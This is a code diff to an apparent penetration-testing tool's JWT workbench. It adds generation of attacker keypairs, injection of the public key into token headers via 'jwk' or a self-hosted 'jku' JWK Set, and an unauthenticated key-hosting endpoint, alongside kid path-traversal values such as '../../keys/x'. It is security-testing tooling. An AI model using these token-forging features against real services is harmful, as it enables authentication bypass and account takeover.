@@ -1,4 +1,13 @@
-"""JWT workbench — decode, sign, alg-switch, key-confusion, kid traversal."""
+"""JWT workbench — decode, sign, alg-switch, key-confusion, kid traversal.
+
+Also mints ephemeral attacker keypairs for the ``jwk`` / ``jku`` header
+injection sinks (action=attacker_key), so the tester never has to drop out
+to ``openssl`` / ``node`` and stand up a separate web server. The keypair is
+kept in a small server-side store keyed by the browser session, and the
+``jku`` mode publishes a JWK Set at ``/jwt/keys/<id>/jwks.json`` that the
+target can fetch — every publish and fetch is logged to History as
+``jwt/jwks-host`` (alongside the smart-input's ``jwt/jwks-fetch``).
+"""
 from __future__ import annotations
 
 import base64
@@ -6,12 +15,28 @@ import contextlib
 import hashlib
 import hmac
 import json
+import secrets
 import time
+from collections import OrderedDict
+from threading import Lock
 from typing import Any
 from urllib.parse import urlsplit
 
 import jwt as pyjwt
-from flask import Blueprint, g, redirect, render_template, request, url_for
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import ec, rsa
+from flask import (
+    Blueprint,
+    abort,
+    current_app,
+    g,
+    redirect,
+    render_template,
+    request,
+    session,
+    url_for,
+)
+from jwt.algorithms import ECAlgorithm, RSAAlgorithm
 
 from ...a11y import summarise_jwt
 from ...engines import Request, httpx_engine
@@ -38,13 +63,182 @@ _EMPTY_FORM = {
     "token": "", "header_text": "", "payload_text": "",
     "alg": "HS256", "secret": "",
     "private_key": "", "public_key": "",
+    "key_type": "RSA", "advertise": "jwk",
     "kid_values": "kid1\nkey-1\n../../keys/x\n/dev/null",
 }
 _EMPTY_OUT: dict[str, Any] = {
     "decoded": None, "summary": "", "signed": "",
     "alg_none": "", "key_confusion": "", "key_source": "",
+    "attacker_key": "", "attacker_key_url": "",
     "kid_set": [], "error": "",
 }
+
+
+# =============================================================================
+# Attacker-key state (ephemeral keypairs + hosted JWK Sets for jwk / jku)
+# =============================================================================
+#
+# The keypair is per-browser-session and lives ONLY in this process (never on
+# disk, never in the signed session cookie). It is reused across presses so
+# the token the tester signs stays consistent with the key that is embedded
+# (jwk) or hosted (jku). The hosted JWK Set contains the PUBLIC half only.
+
+def _mint_keypair(kty: str) -> dict[str, Any]:
+    """Generate an ephemeral keypair. ``kty`` is 'RSA' or 'EC'.
+
+    Returns a record with the PKCS8 private-key PEM, the public JWK (with a
+    random kid + alg), the JWS ``alg`` to use, and the kid.
+    """
+    kid = secrets.token_hex(4)
+    if kty == "EC":
+        priv: Any = ec.generate_private_key(ec.SECP256R1())
+        alg = "ES256"
+        public_jwk = json.loads(ECAlgorithm.to_jwk(priv.public_key()))
+    else:  # RSA-2048 default
+        kty = "RSA"
+        priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        alg = "RS256"
+        public_jwk = json.loads(RSAAlgorithm.to_jwk(priv.public_key()))
+    public_jwk["kid"] = kid
+    public_jwk["use"] = "sig"
+    public_jwk["alg"] = alg
+    private_pem = priv.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.PKCS8,
+        encryption_algorithm=serialization.NoEncryption(),
+    ).decode("ascii")
+    return {
+        "kty": kty, "alg": alg, "kid": kid,
+        "private_pem": private_pem, "public_jwk": public_jwk,
+        "host_id": None,
+    }
+
+
+class _AttackerKeyState:
+    """Thread-safe, bounded store of per-session attacker keypairs and the
+    JWK Sets hosted for the jku sink. In-process only; cleared on restart."""
+
+    def __init__(self, max_sessions: int = 64) -> None:
+        self._lock = Lock()
+        self._keys: OrderedDict[str, dict[str, Any]] = OrderedDict()
+        self._hosted: OrderedDict[str, bytes] = OrderedDict()
+        self._max = max_sessions
+
+    def keypair(self, sid: str, kty: str) -> dict[str, Any]:
+        """Return the session's keypair, minting a fresh one only when none
+        exists yet or the requested key type changed. The stable ``host_id``
+        (if any) is carried over so an already-published jku URL keeps
+        working after a key-type switch."""
+        with self._lock:
+            rec = self._keys.get(sid)
+            if rec is None or rec["kty"] != kty:
+                fresh = _mint_keypair(kty)
+                if rec is not None:
+                    fresh["host_id"] = rec.get("host_id")
+                self._keys[sid] = fresh
+                self._keys.move_to_end(sid)
+                self._evict_locked()
+                return fresh
+            self._keys.move_to_end(sid)
+            return rec
+
+    def publish_jwks(self, sid: str) -> tuple[str, bytes]:
+        """Publish (or refresh) the session key's public JWK Set. Returns
+        ``(host_id, jwks_bytes)``. Raises KeyError if no keypair exists."""
+        with self._lock:
+            rec = self._keys.get(sid)
+            if rec is None:
+                raise KeyError("no keypair for session")
+            host_id = rec.get("host_id") or secrets.token_hex(3)
+            rec["host_id"] = host_id
+            jwks = json.dumps(
+                {"keys": [rec["public_jwk"]]}, separators=(",", ":")
+            ).encode("utf-8")
+            self._hosted[host_id] = jwks
+            self._hosted.move_to_end(host_id)
+            while len(self._hosted) > self._max:
+                self._hosted.popitem(last=False)
+            return host_id, jwks
+
+    def get_hosted(self, host_id: str) -> bytes | None:
+        with self._lock:
+            return self._hosted.get(host_id)
+
+    def _evict_locked(self) -> None:
+        while len(self._keys) > self._max:
+            _old_sid, old = self._keys.popitem(last=False)
+            hid = old.get("host_id")
+            if hid:
+                self._hosted.pop(hid, None)
+
+
+_attacker_state = _AttackerKeyState()
+
+
+def _session_id() -> str:
+    """Stable per-browser-session id used to key the attacker keypair."""
+    sid = session.get("jwt_sid")
+    if not sid:
+        sid = secrets.token_urlsafe(12)
+        session["jwt_sid"] = sid
+    return sid
+
+
+def _ui_base_url() -> str:
+    """Base URL the jku endpoint is reachable at, on the same interface as
+    the UI. ``0.0.0.0`` / ``::`` (e.g. the Docker bind) is rewritten to
+    ``127.0.0.1`` so the URL is actually fetchable by a local lab target."""
+    settings = g.settings
+    host = (getattr(settings, "ui_host", "") or "").strip()
+    if host in ("0.0.0.0", "::", ""):  # noqa: S104  # comparison to rewrite an all-interfaces bind into a fetchable loopback URL, not a bind
+        host = "127.0.0.1"
+    port = getattr(settings, "ui_port", 8787)
+    return f"http://{host}:{port}"
+
+
+def _log_jwks_publish(url: str, jwks: bytes) -> None:
+    """Record the act of hosting the JWK Set as a History row
+    (engine=jwt/jwks-host). Best-effort; never fails the action."""
+    parts = urlsplit(url)
+    host = parts.hostname or ""
+    if parts.port:
+        host = f"{host}:{parts.port}"
+    raw_req = (
+        f"PUT {parts.path} HTTP/1.1\r\nHost: {host}\r\n"
+        f"Content-Type: application/jwk-set+json\r\n"
+        f"Content-Length: {len(jwks)}\r\n\r\n"
+    ).encode("latin-1", "replace") + jwks
+    raw_resp = (
+        b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n"
+        b"JWK Set published by Reqlore; awaiting target fetch."
+    )
+    with contextlib.suppress(Exception):
+        g.project.add_history(
+            host=host, method="PUT", url=url, status=200, duration_ms=0,
+            engine="jwt/jwks-host", raw_req=raw_req, raw_resp=raw_resp,
+        )
+
+
+def _log_jwks_host_fetch(jwks: bytes) -> None:
+    """Record an inbound fetch of the hosted JWK Set (engine=jwt/jwks-host)."""
+    host = request.host or ""
+    ua = request.headers.get("User-Agent", "")
+    raw_req = (
+        f"GET {request.path} HTTP/1.1\r\nHost: {host}\r\n"
+        f"User-Agent: {ua}\r\n\r\n"
+    ).encode("latin-1", "replace")
+    raw_resp = (
+        b"HTTP/1.1 200 OK\r\n"
+        b"Content-Type: application/jwk-set+json\r\n"
+        + f"Content-Length: {len(jwks)}\r\n\r\n".encode("ascii")
+        + jwks
+    )
+    with contextlib.suppress(Exception):
+        g.project.add_history(
+            host=host, method="GET", url=request.url, status=200,
+            duration_ms=0, engine="jwt/jwks-host",
+            raw_req=raw_req, raw_resp=raw_resp,
+        )
 
 
 def _render_raw_get(url: str, extra_headers: list[tuple[str, str]]) -> bytes:
@@ -211,6 +405,60 @@ def index():
         except Exception as e:
             out["error"] = f"{type(e).__name__}: {e}"
 
+    elif action == "attacker_key":
+        # Mint (or reuse) an ephemeral attacker keypair for the jwk / jku
+        # header-injection sinks. Writes the PKCS8 private PEM into the
+        # existing private_key field and sets alg to RS256 / ES256, so the
+        # tester finishes the forge with the normal Sign button — nothing
+        # about signing changes. Advertise via:
+        #   * jwk — embed the public key as a jwk member in the header;
+        #   * jku — host a JWK Set and point the header's jku at it.
+        kty = "EC" if (form.get("key_type") or "").upper().startswith("EC") else "RSA"
+        advertise = (form.get("advertise") or "").strip().lower()
+        if advertise not in ("jwk", "jku"):
+            out["error"] = "Choose an advertise-via option (jwk or jku)."
+        else:
+            rec = _attacker_state.keypair(_session_id(), kty)
+            form["private_key"] = rec["private_pem"]
+            form["alg"] = rec["alg"]
+            form["key_type"] = kty
+            form["advertise"] = advertise
+            # Preserve the rest of the header; only touch the members we own.
+            try:
+                hdr = json.loads(form["header_text"]) if (form["header_text"] or "").strip() else {}
+                if not isinstance(hdr, dict):
+                    hdr = {}
+            except (ValueError, TypeError):
+                hdr = {}
+            hdr["alg"] = rec["alg"]
+            kty_label = "RSA-2048" if kty == "RSA" else "EC P-256"
+            if advertise == "jwk":
+                hdr.pop("jku", None)          # jwk and jku are mutually exclusive
+                hdr["jwk"] = rec["public_jwk"]
+                form["header_text"] = json.dumps(hdr, indent=2)
+                out["attacker_key"] = (
+                    f"Attacker key generated ({kty_label}); "
+                    "public half embedded as jwk."
+                )
+            else:  # jku
+                base = _ui_base_url()
+                try:
+                    host_id, jwks = _attacker_state.publish_jwks(_session_id())
+                    url = f"{base}/jwt/keys/{host_id}/jwks.json"
+                except Exception:  # noqa: BLE001 - surface a friendly message, never a 500
+                    out["error"] = f"Could not start the key-host endpoint on {base}/jwt/keys/."
+                else:
+                    hdr.pop("jwk", None)
+                    hdr["jku"] = url
+                    hdr["kid"] = rec["kid"]
+                    form["header_text"] = json.dumps(hdr, indent=2)
+                    out["attacker_key"] = (
+                        f"Attacker key generated ({kty_label}); "
+                        f"JWK Set hosted at {url}."
+                    )
+                    out["attacker_key_url"] = url
+                    _log_jwks_publish(url, jwks)
+
     elif action == "alg_none":
         h, p, _sig, err = _decode_unverified(form["token"])
         if err:
@@ -279,3 +527,22 @@ def index():
 
     token = _cache.put({"form": form, "out": out})
     return redirect(url_for(".index", t=token))
+
+
+@bp.route("/keys/<host_id>/jwks.json", methods=["GET"])
+def jwks_host(host_id: str):
+    """Serve a hosted attacker JWK Set (public half only) for the jku sink.
+
+    This endpoint is intentionally unauthenticated and free of any
+    allow-list / SSRF guard: testers legitimately point a target's ``jku``
+    header at localhost and lab IPs, and the target — not the operator's
+    browser — is what fetches it. It only ever returns the generated PUBLIC
+    JWK Set; the private key is never exposed here. Every fetch is logged to
+    History as ``jwt/jwks-host``. Unknown ids 404.
+    """
+    jwks = _attacker_state.get_hosted(host_id)
+    if jwks is None:
+        abort(404, description="No JWK Set is hosted at this id.")
+    _log_jwks_host_fetch(jwks)
+    resp = current_app.response_class(jwks, mimetype="application/jwk-set+json")
+    return resp
